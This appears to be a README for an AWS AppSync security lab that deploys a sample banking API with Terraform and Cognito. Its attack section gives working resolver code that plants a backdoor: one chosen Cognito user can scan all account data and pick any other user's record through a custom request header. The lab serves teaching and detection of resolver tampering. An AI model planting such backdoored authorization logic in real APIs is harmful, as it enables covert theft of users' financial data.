# AppSync - Resolver Manipulation

## Overview

This setup deploys an AWS AppSync service, utilizing AWS IAM as the default authentication mode and featuring an additional endpoint authenticated via AWS Cognito. The scenario, inspired by an AWS tutorial [DynamoDB Transaction resolvers](https://docs.aws.amazon.com/appsync/latest/devguide/tutorial-dynamodb-transact-js.html), simulates specific banking functionalities.

Also, it includes a few HTML's to simulate a website that allows users to authenticate via cognito and view their balances.

## Prerequisites

- AWS CLI configured with necessary permissions.
- Terraform installed.

## Deploying the Infrastructure

**INFO**: If AppSync-Scenario2 was executed go directly to step number 6.

1. **Initialize Terraform**:
    ```bash
    terraform init
    ```

2. **Review Changes**:
    ```bash
    terraform plan
    ```

3. **Deploy Resources**:
    ```bash
    terraform apply
    ```
4. **Create Cognito users**: Access the AWS console, go to AWS Cognito and create a few users.


5. **Populate data in DynamoDB**:

Acces the AWS console, go to AWS AppSync and using the query option, execute the following mutation. Making sure to use the sub from Cognito as account name:

```
mutation populateAccounts {
  populateAccounts (
    savingAccounts: [
      {accountNumber: "SUB_FROM_COGNITO", username: "Tom", balance: 100},
      {accountNumber: "SUB_FROM_COGNITO", username: "Amy", balance: 90},
      {accountNumber: "SUB_FROM_COGNITO", username: "Lily", balance: 80},
    ]
    checkingAccounts: [
      {accountNumber: "SUB_FROM_COGNITO", username: "Tom", balance: 70},
      {accountNumber: "SUB_FROM_COGNITO", username: "Amy", balance: 60},
      {accountNumber: "SUB_FROM_COGNITO", username: "Lily", balance: 50},
    ]) {
    savingAccounts {
      accountNumber
    }
    checkingAccounts {
      accountNumber
    }
  }
}
```

6. **[Optional] Configure the web**: 
 - Update the COGNITO_APP_CLIENT_ID, APPSYNC_DOMAIN, and APPSYNC_ID in the callback.html and index.html files located in the www folder with your Amazon Cognito configuration data.
 - Navigate to the www folder and utilize Python's HTTP server to serve the web application: use python -m http.server [port] (Python 3.x) or python -m SimpleHTTPServer [port] (Python 2.x), replacing [port] with the desired port number or omitting it for default port 8000.
 - Access the web application via your browser at http://localhost:[port], substituting [port] with the utilized port number.

## Attacking the Infrastructure

Modify the getMyAccounts resolver with the following code:

```
export function request(ctx) {
    console.log(ctx)
    if (ctx.identity.sub == "SUB_FROM_COGNITO") {
      return { operation: 'Scan' };
    }
    else {
     return {
        version: '2018-05-29',
        operation: 'TransactGetItems',
        transactItems: [
            { table: 'savingAccounts', key: util.dynamodb.toMapValues({ accountNumber: ctx.identity.sub }) },
            { table: 'checkingAccounts', key: util.dynamodb.toMapValues({ accountNumber: ctx.identity.sub }) }
        ],
    };   
    }
}

export function response(ctx) {
    if (ctx.error) {
        util.error(ctx.error.message, ctx.error.type, null, ctx.result.cancellationReasons);
    }
    if (ctx.identity.sub == "SUB_FROM_COGNITO") {
      const items = ctx.result.items;
      let index = +ctx.request.headers.account;
      const savingAccounts = [items[index]];
      return { savingAccounts }; 
    }
    else {
      const items = ctx.result.items;
      const savingAccounts = [items[0]];
      const checkingAccounts = [items[1]];
      return { savingAccounts, checkingAccounts }; 
    }
}
```

Make sure to modify the SUB_FROM_COGNITO with a valid SUB from Cognito from a user you have created.

## Understanding the Attack

The attacker manipulates the resolver code within AWS AppSync, where the authorization logic is implemented, to enable special functionality when a user, controlled by the attacker, queries the API. Specifically, the manipulated resolver allows the attacker’s user to retrieve data from other users. By employing a customized header in the API request, the attacker can control and specify which user data to retrieve

## Cleanup

To avoid incurring additional charges, ensure you destroy the Terraform-managed resources once done:

```bash
terraform destroy
```

⚠️ **Warning** ⚠️

> The content and techniques described here are meant for educational and awareness purposes only. Always be cautious when testing and use only in safe, controlled environments. Unauthorized use or misuse can lead to legal consequences and potential harm.
